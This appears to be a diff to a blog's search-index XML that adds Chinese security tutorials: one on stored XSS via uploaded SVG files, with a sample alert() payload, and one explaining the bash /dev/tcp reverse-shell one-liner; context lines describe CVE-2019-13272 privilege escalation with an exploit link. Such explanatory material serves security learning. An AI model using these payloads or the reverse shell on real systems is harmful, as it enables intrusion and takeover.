@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[SVG-XSS]]></title>
+    <url>%2F2019%2F10%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SVG-XSS%2F</url>
+    <content type="text"><![CDATA[SVG-XSS 介绍 SVG文件 Xss Payload SVG-XSS介绍 跨站点脚本（XSS）是一个非常常见的漏洞，涉及在网页中注入javascript代码。从窃取用户Cookie到通过CORS绕过SOP，此漏洞可用于执行各种操作。有许多方法可以定位XSS漏洞，通常会忽略SVG文件。 SVG文件 可缩放矢量图形（SVG）是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画。 以下代码是基本SVG文件的示例： 123&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt; SVG文件还支持嵌入式javascript代码。例如，开发人员可能在svg图像中使用javascript，以便他们可以实时进行操作。这可以用于动画和其他任务。 要注意的另一件事是，SVG文件可以视为HTML中的图像。这意味着您可以将SVG文件放置在图像标签中，并且可以完美呈现： 1&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt; Xss Payload 如果网站使用XSS有效负载加载SVG文件，则将执行该文件。开发人员和攻击者都经常忽视这一点。以下是带有警报XSS有效负载的SVG文件示例： 123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&quot;SVG XSS&quot;); &lt;/script&gt;&lt;/svg&gt; 上传时，注意内容类型设置为：Content-Type: image/svg+xml 上传图像后，您只需找出图像上载到的路径即可。如果您使用的是Google chrome，则可以通过右键单击图片并选择“复制图片地址”来轻松完成此操作。如果在查看图像时一切正常，则将执行有效负载。您只是通过SVG文件存储了XSS。]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+      <tags>
+        <tag>WEB渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[CVE-2019-13272-Linux本地提权漏洞]]></title>
     <url>%2F2019%2F10%2F08%2FCVE-2019-13272%2F</url>
     <content type="text"><![CDATA[漏洞概述： 影响范围 复现环境 漏洞复现 漏洞概述： 当调用PTRACE_TRACEME时，ptrace_link函数将获得对父进程凭据的RCU引用，然后将该指针指向get_cred函数。但是，对象struct cred的生存周期规则不允许无条件地将RCU引用转换为稳定引用。 PTRACE_TRACEME获取父进程的凭证，使其能够像父进程一样执行父进程能够执行的各种操作。如果恶意低权限子进程使用PTRACE_TRACEME并且该子进程的父进程具有高权限，该子进程可获取其父进程的控制权并且使用其父进程的权限调用execve函数创建一个新的高权限进程。攻击者最终控制具有高权限的两个进程ptrace关系，可以被用来ptrace，suid二进制文件并获得root权限。 影响范围 目前受影响的Linux内核版本： Linux Kernel &lt; 5.1.17 复现环境 exploit下载地址： https://github.com/vkbiu/CVE/tree/master/CVE-2019-13272 Ubuntu 4.13.0-38-generic Kali未复现成功，普通用户执行gcc，提示权限不够 漏洞复现 利用效果如下图:]]></content>
@@ -130,6 +141,17 @@
       </categories>
       <tags>
         <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[深入理解bash反弹shell命令]]></title>
+    <url>%2F2019%2F05%2F20%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3bash%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%2F</url>
+    <content type="text"><![CDATA[0x00 首先了解下shell 0x01 bash反弹shell 0x001 关于-i 0x002 关于&gt;&amp; 0x003 关于0&gt;&amp;1 0x004 关于 /dev/tcp/host/port 0x00 首先了解下shell Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。 以下是几种shell版本，bash是默认的： sh(全称 Bourne Shell): 是UNIX最初使用的 shell，而且在每种 UNIX 上都可以使用。Bourne Shell 在 shell 编程方面相当优秀，但在处理与用户的交互方面做得不如其他几种 shell。bash（全称 Bourne Again Shell）: LinuxOS 默认的，它是 Bourne Shell 的扩展。与 Bourne Shell 完全兼容，并且在 Bourne Shell 的基础上增加了很多特性。可以提供命令补全，命令编辑和命令历史等功能。它还包含了很多 C Shell 和 Korn Shell 中的优点，有灵活和强大的编辑接口，同时又很友好的用户界面。 csh(全称 C Shell): 是一种比 Bourne Shell更适合的变种 Shell，它的语法与 C 语言很相似。Tcsh: 是 Linux 提供的 C Shell 的一个扩展版本。Tcsh 包括命令行编辑，可编程单词补全，拼写校正，历史命令替换，作业控制和类似 C 语言的语法，他不仅和 Bash Shell 提示符兼容，而且还提供比 Bash Shell 更多的提示符参数。ksh (全称 Korn Shell): 集合了 C Shell 和 Bourne Shell 的优点并且和 Bourne Shell 完全兼容。pdksh: 是 Linux 系统提供的 ksh 的扩展。pdksh 支持人物控制，可以在命令行上挂起，后台执行，唤醒或终止程序。 0x01 bash反弹shell 对于bash反弹shell这条命令，相信很多人都很熟悉了: 1/bin/bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1 但是这里面的每个细节是否都清楚了，这可就不一定了 0x001 关于-i 12root@kali:~# man bash | grep -E &quot;\-i&quot; -i If the -i option is present, the shell is interactive. 首先 -i 是交互的模式，但是发现其实不用-i参数也是可以的，因为bash就是处理用户交互的 0x002 关于&gt;&amp; 1234567891011121314151617181920212223242526272829303132root@kali:~# man bash | grep &quot;Redirecting Standard Output and Standard Error&quot; -A 30 Redirecting Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be redirected to the file whose name is the expansion of word. There are two formats for redirecting standard output and standard error: &amp;&gt;word and &gt;&amp;word Of the two forms, the first is preferred. This is semantically equiva‐ lent to &gt;word 2&gt;&amp;1 When using the second form, word may not expand to a number or -. If it does, other redirection operators apply (see Duplicating File Descriptors below) for compatibility reasons. Appending Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be appended to the file whose name is the expansion of word. The format for appending standard output and standard error is: &amp;&gt;&gt;word This is semantically equivalent to 看bash的文档，可以看到，这个是将标准输出和标准错误都重定向了跟 &gt;word 2&gt;&amp;1 的效果是一致的 当然我们用 &amp;&gt; 也是可以的 0x003 关于0&gt;&amp;1 0&gt;1是将标准输入重定向到文件名为1的文件，不存在就创建所以为了区别，那就在1前面加个&amp;来表示标准输出。 0&gt;&amp;1 0x004 关于 /dev/tcp/host/port 我们知道linux一切皆文件，但是其实这个文件肯定是不存在的 我们可以从man文档中看到 1234567root@kali:~# man bash | grep &quot;/dev/tcp&quot; -A 5 /dev/tcp/host/port If host is a valid hostname or Internet address, and port is an integer port number or service name, bash attempts to open the corresponding TCP socket. /dev/udp/host/port If host is a valid hostname or Internet address, and port 那么这个是在主机名、ip地址以及端口有效的情况，会打开一个TCP的套接字，连接对应主机的对应端口]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>反弹Shell</tag>
       </tags>
   </entry>
   <entry>
